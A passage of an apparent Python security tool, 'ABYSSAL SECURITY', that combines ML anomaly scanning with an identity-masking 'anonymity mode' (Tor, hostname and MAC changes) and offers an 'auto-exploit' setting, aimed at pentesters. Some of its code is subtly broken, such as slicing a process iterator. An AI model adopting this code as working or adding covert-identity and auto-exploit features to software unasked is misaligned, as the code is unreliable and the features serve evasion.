        dangerous_processes = ['gnome-keyring-daemon', 'kwalletd5', 'secret-service']
        found_processes = []
        
        for proc in psutil.process_iter(['name']):
            try:
                if proc.info['name'] in dangerous_processes:
                    found_processes.append(proc.info['name'])
            except:
                continue
        
        if found_processes:
            print(f"   ⚠️  Found: {', '.join(found_processes)}")
        else:
            print("   ✅ No dangerous processes found")
        
        print("\n🎭 ANONYMITY STATUS COMPLETE")
    
    def restore_identity(self):
        """Restore original system identity"""
        print("🔄 RESTORING IDENTITY")
        print("=" * 50)
        
        try:
            # Stop Tor service
            print("🔧 Stopping Tor service...")
            subprocess.run(['sudo', 'systemctl', 'stop', 'tor'], check=True)
            print("✅ Tor service stopped")
            
            # Restore original MAC addresses
            print("🔧 Restoring MAC addresses...")
            # In a real implementation, you'd store original MACs first
            print("⚠️  Original MAC restoration requires saved configuration")
            
            # Restore original hostname
            print("🔧 Restoring hostname...")
            original_hostname = "kali"  # Default Kali hostname
            subprocess.run(['sudo', 'hostname', original_hostname], check=True)
            with open('/etc/hostname', 'w') as f:
                f.write(original_hostname + '\n')
            print(f"✅ Hostname restored to: {original_hostname}")
            
            # Clear proxy environment
            print("🔧 Clearing proxy environment...")
            proxy_vars = ['HTTP_PROXY', 'HTTPS_PROXY', 'FTP_PROXY', 'SOCKS_PROXY']
            for var in proxy_vars:
                if var in os.environ:
                    del os.environ[var]
                    print(f"✅ Cleared {var}")
            
            print("\n🔓 IDENTITY RESTORED")
            print("⚠️  Your original system identity is back")
            print("🌐 Traffic no longer routed through Tor")
            
        except Exception as e:
            print(f"❌ Identity restoration error: {e}")
    
    def interactive_mode(self):
        """Interactive AI/ML security control panel"""
        while True:
            self.show_banner()
            
            print("🤖 AI/ML SECURITY OPTIONS:")
            print("┌─────────────────────────────────────────────────────────────────┐")
            print("│ 1️⃣  🤖 ML Real-time Monitor  6️⃣  👤 Anonymity Mode        │")
            print("│ 2️⃣  🧠 ML Comprehensive Scan 7️⃣  🔧 Retrain Models       │")
            print("│ 3️⃣  📁 ML File Analysis      8️⃣  ⚙️ ML Configuration      │")
            print("│ 4️⃣  🔧 ML Process Analysis   9️⃣  📊 Model Statistics     │")
            print("│ 5️⃣  🌐 ML Network Analysis  🔟  🔙 Exit                  │")
            print("└─────────────────────────────────────────────────────────────────┘")
            print()
            print("💡 QUICK COMMAND REFERENCE:")
            print("   python3 abyssal.py --ml-monitor    # Real-time ML monitoring")
            print("   python3 abyssal.py --ml-scan       # ML comprehensive scan")
            print("   python3 abyssal.py --anon          # Activate anonymity mode")
            print("   python3 abyssal.py --retrain       # Retrain ML models")
            print()
            
            try:
                choice = input("⚡ Select option (1-10): ").strip()
                
                if choice == '1':
                    self.ml_real_time_monitor()
                elif choice == '2':
                    self.run_ml_comprehensive_scan()
                elif choice == '3':
                    self.run_ml_file_analysis()
                elif choice == '4':
                    self.run_ml_process_analysis()
                elif choice == '5':
                    self.run_ml_network_analysis()
                elif choice == '6':
                    self.run_anonymity_mode()
                elif choice == '7':
                    self.retrain_ml_models()
                elif choice == '8':
                    self.configure_ml_settings()
                elif choice == '9':
                    self.show_model_statistics()
                elif choice == '10':
                    print("👋 Goodbye!")
                    break
                else:
                    print("❌ Invalid option!")
                    
                input("\n⏸️  Press Enter to continue...")
                
            except KeyboardInterrupt:
                print("\n👋 Goodbye!")
                break
            except Exception as e:
                print(f"\n❌ Error: {e}")
                input("\n⏸️  Press Enter to continue...")
    
    def run_ml_file_analysis(self):
        """Run ML file analysis"""
        print("📁 ML FILE ANALYSIS")
        print("=" * 50)
        
        file_path = input("Enter file path to analyze: ").strip()
        
        if not file_path or not Path(file_path).exists():
            print("❌ Invalid file path")
            return
            
        print(f"\n🧠 Analyzing {file_path} with ML models...")
        
        threats = self.ml_detector.analyze_file_with_ml(Path(file_path))
        
        if threats:
            print(f"\n⚠️  ML ANOMALIES DETECTED:")
            for threat in threats:
                print(f"   {threat}")
        else:
            print("\n✅ No ML anomalies detected - File appears normal")
    
    def run_ml_process_analysis(self):
        """Run ML process analysis"""
        print("🔧 ML PROCESS ANALYSIS")
        print("=" * 50)
        
        pid_input = input("Enter PID to analyze (or 'all' for all processes): ").strip()
        
        if pid_input == 'all':
            print("\n🧠 Analyzing all processes with ML models...")
            all_threats = []
            
            for process in psutil.process_iter(['pid'])[:50]:
                try:
                    pid = process.info['pid']
                    threats = self.ml_detector.analyze_process_with_ml(pid)
                    all_threats.extend(threats)
                except:
                    continue
                    
            if all_threats:
                print(f"\n⚠️  ML PROCESS ANOMALIES DETECTED:")
                for threat in all_threats:
                    print(f"   {threat}")
            else:
                print("\n✅ No ML process anomalies detected")
                
        elif pid_input.isdigit():
            pid = int(pid_input)
            print(f"\n🧠 Analyzing process {pid} with ML models...")
            
            threats = self.ml_detector.analyze_process_with_ml(pid)
            
            if threats:
                print(f"\n⚠️  ML PROCESS ANOMALIES DETECTED:")
                for threat in threats:
                    print(f"   {threat}")
            else:
                print("\n✅ No ML anomalies detected - Process appears normal")
        else:
            print("❌ Invalid input")
    
    def run_ml_network_analysis(self):
        """Run ML network analysis"""
        print("🌐 ML NETWORK ANALYSIS")
        print("=" * 50)
        
        print("\n🧠 Analyzing network connections with ML models...")
        
        all_threats = []
        connections = psutil.net_connections()[:100]
        
        for conn in connections:
            try:
                threats = self.ml_detector.analyze_network_with_ml(conn)
                all_threats.extend(threats)
            except:
                continue
                
        if all_threats:
            print(f"\n⚠️  ML NETWORK ANOMALIES DETECTED:")
            for threat in all_threats:
                print(f"   {threat}")
        else:
            print("\n✅ No ML network anomalies detected")
    
    def retrain_ml_models(self):
        """Retrain ML models"""
        print("🧠 RETRAINING ML MODELS")
        print("=" * 50)
        
        print("🔄 Retraining ML models with current system data...")
        
        try:
            self.ml_detector.train_initial_models()
            self.ml_detector.save_models()
            print("✅ ML models retrained successfully")
        except Exception as e:
            print(f"❌ Error retraining models: {e}")
    
    def configure_ml_settings(self):
        """Configure ML settings"""
        print("⚙️ ML CONFIGURATION")
        print("=" * 50)
        
        print(f"📊 Current ML settings:")
        for key, value in self.config.items():
            print(f"   {key}: {value}")
        
        print("\n🔧 ML Settings:")
        print("1. Toggle ML detection")
        print("2. Change scan interval")
        print("3. Toggle auto-exploit")
        print("4. Reset ML models")
        print("5. Back to main menu")
        
        try:
            choice = input("⚡ Select option: ").strip()
            
            if choice == '1':
                self.config['ml_detection'] = not self.config['ml_detection']
                print(f"✅ ML detection: {self.config['ml_detection']}")
            elif choice == '2':
                interval = input("Enter scan interval (seconds): ").strip()
                if interval.isdigit():
                    self.config['scan_interval'] = int(interval)
                    print(f"✅ Scan interval: {self.config['scan_interval']}s")
            elif choice == '3':
                self.config['auto_exploit'] = not self.config['auto_exploit']
                print(f"✅ Auto-exploit: {self.config['auto_exploit']}")
            elif choice == '4':
                self.reset_ml_models()
            elif choice == '5':
                return
            else:
                print("❌ Invalid option!")
                
            self.save_config()
            
        except Exception as e:
            print(f"❌ Configuration error: {e}")
    
    def reset_ml_models(self):
        """Reset ML models"""
        print("🔄 RESETTING ML MODELS")
        print("=" * 50)
        
        try:
            # Delete model files
            for model_file in MODEL_DIR.glob("*.pkl"):
                model_file.unlink()
                
            # Reinitialize detector
            self.ml_detector = MLThreatDetector()
            
            print("✅ ML models reset successfully")
        except Exception as e:
            print(f"❌ Error resetting models: {e}")
    
    def show_model_statistics(self):
        """Show ML model statistics"""
        print("📊 ML MODEL STATISTICS")
        print("=" * 50)
        
        print(f"🤖 ML Models loaded: {len(self.ml_detector.models)}")
        print(f"📏 Feature scalers: {len(self.ml_detector.scalers)}")
        print(f"✅ Baseline established: {self.ml_detector.baseline_established}")
        print(f"📈 Threat history size: {len(self.ml_detector.threat_history)}")
        
        print(f"\n🧠 Available Models:")
        for model_name in self.ml_detector.models.keys():
            print(f"   {model_name}")
    
    def _play_alert_sound(self):
        """Play alert sound on threat detection"""
        try:
            # Try multiple alert methods
            alert_methods = [
                lambda: os.system('echo -e "\\a"'),
                lambda: os.system('paplay /usr/share/sounds/alsa/Front_Left.wav 2>/dev/null'),
                lambda: os.system('beep -f 1000 -l 500 2>/dev/null'),
                lambda: os.system('speaker-test -t sine -f 1000 -l 1 2>/dev/null')
            ]
            
            for method in alert_methods:
                try:
                    method()
                    break
                except:
                    continue
                    
        except Exception:
            print('\a', end='', flush=True)

def main():
    """Main application entry point"""
    app = AbyssalSecurity()
    
    parser = argparse.ArgumentParser(description="ABYSSAL SECURITY - AI/ML Security Framework")
    parser.add_argument('--interactive', action='store_true', help='Interactive AI/ML security control panel')
    parser.add_argument('--ml-scan', action='store_true', help='Run ML comprehensive scan')
    parser.add_argument('--ml-monitor', action='store_true', help='Start ML real-time monitoring')
    parser.add_argument('--anon', action='store_true', help='Activate anonymity mode')
    parser.add_argument('--check-anon', action='store_true', help='Check anonymity status')
    parser.add_argument('--restore', action='store_true', help='Restore original identity')
    parser.add_argument('--retrain', action='store_true', help='Retrain ML models')
    parser.add_argument('--config', action='store_true', help='Configure ML settings')
    
    args = parser.parse_args()
    
    if args.interactive:
        app.interactive_mode()
    elif args.ml_scan:
        app.run_ml_comprehensive_scan()
    elif args.ml_monitor:
        app.ml_real_time_monitor()
    elif args.anon:
        app.run_anonymity_mode()
    elif args.check_anon:
        app.check_anonymity_status()
    elif args.restore:
        app.restore_identity()
    elif args.retrain:
        app.retrain_ml_models()
    elif args.config:
        app.configure_ml_settings()
    else:
        app.show_banner()
        print("🤖 ABYSSAL SECURITY - AI/ML Security Framework")
        print("\n🔥 ALL AVAILABLE COMMANDS:")
        print("┌─────────────────────────────────────────────────────────────────┐")
        print("│  🤖 AI/ML COMMANDS:                                           │")
        print("│  python3 abyssal.py --interactive    # Full AI/ML control panel │")
        print("│  python3 abyssal.py --ml-monitor     # Real-time ML monitoring  │")
        print("│  python3 abyssal.py --ml-scan        # ML comprehensive scan   │")
        print("│  python3 abyssal.py --retrain        # Retrain ML models       │")
        print("│  python3 abyssal.py --config         # Configure ML settings   │")
        print("│                                                               │")
        print("│  👤 ANONYMITY MODE:                                           │")
        print("│  python3 abyssal.py --anon           # Activate anonymity mode │")
        print("│  python3 abyssal.py --check-anon     # Check anonymity status  │")
        print("│  python3 abyssal.py --restore        # Restore identity        │")
        print("│                                                               │")
        print("│  🎮 INTERACTIVE MODE OPTIONS:                                │")
        print("│  1️⃣ 🤖 ML Real-time Monitor    # AI-powered monitoring          │")
        print("│  2️⃣ 🧠 ML Comprehensive Scan  # Full ML analysis               │")
        print("│  3️⃣ 📁 ML File Analysis      # ML file anomaly detection       │")
        print("│  4️⃣ 🔧 ML Process Analysis   # ML process behavior analysis    │")
        print("│  5️⃣ 🌐 ML Network Analysis  # ML network anomaly detection    │")
        print("│  6️⃣ 👤 Anonymity Mode        # Complete identity protection    │")
        print("│  7️⃣ 🔧 Retrain Models       # Retrain ML models                │")
        print("│  8️⃣ ⚙️ ML Configuration      # Configure ML settings            │")
        print("│  9️⃣ 📊 Model Statistics     # Show ML model info               │")
        print("└─────────────────────────────────────────────────────────────────┘")
        print("\n🚀 QUICK START: python3 abyssal.py --interactive")
        print("🔥 PERFECT FOR PENTESTERS - STAY ANONYMOUS, STAY SECURE! 🔥")

if __name__ == "__main__":
    main()
